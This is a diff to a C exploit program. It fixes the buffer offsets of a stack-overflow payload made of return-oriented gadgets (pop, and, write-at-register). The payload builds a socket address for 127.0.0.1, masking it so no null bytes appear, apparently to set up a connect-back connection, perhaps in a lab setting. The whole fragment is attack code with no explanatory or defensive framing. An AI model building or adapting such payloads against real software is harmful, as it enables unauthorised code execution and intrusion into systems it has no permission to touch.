@@ -58,7 +58,7 @@ int main(void)
   
   char con_arg_ip[] = "\x7f\x01\x01\x01";
   char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
-  char con_arg_ip_addr[] = "\x24\x68\xbf\xbf"; // bufr + 263
+  char con_arg_ip_addr[] = "\x28\x68\xbf\xbf"; // bufr + 267
 
   // bufr + 259
   // info.filler = "\x01"
@@ -132,19 +132,19 @@ int main(void)
   strcpy(bufr + 243, pop_edx);
   strcpy(bufr + 247, con_arg_ip);
   // pop mask into eax
-  strcpy(bufr + 243, pop_eax);
-  strcpy(bufr + 247, con_arg_ip_mask);
+  strcpy(bufr + 251, pop_eax);
+  strcpy(bufr + 255, con_arg_ip_mask); 
   // AND ecx and eax to get ip address
-  strcpy(bufr + 251, and_eax_edx);
+  strcpy(bufr + 259, and_eax_edx);
                                   // eax should have 0x0100007f
   // store socket struct and jump over it
-  strcpy(bufr + 255, jump_16);
-  strcpy(bufr + 259, sockaddr_in);
+  strcpy(bufr + 263, jump_16);
+  strcpy(bufr + 267, sockaddr_in);
   // pop ip address addr into edx
-  strcpy(bufr + 275, pop_edx);
-  strcpy(bufr + 279, con_arg_ip_addr);
+  strcpy(bufr + 283, pop_edx);
+  strcpy(bufr + 287, con_arg_ip_addr);
   // write eax to where edx points
-  strcpy(bufr + 279, write_at_edx_from_eax);
+  strcpy(bufr + 291, write_at_edx_from_eax);
                                             // 0x0bfbf6824 should store 0x0100007f
   //
   // hardcoded file descriptor
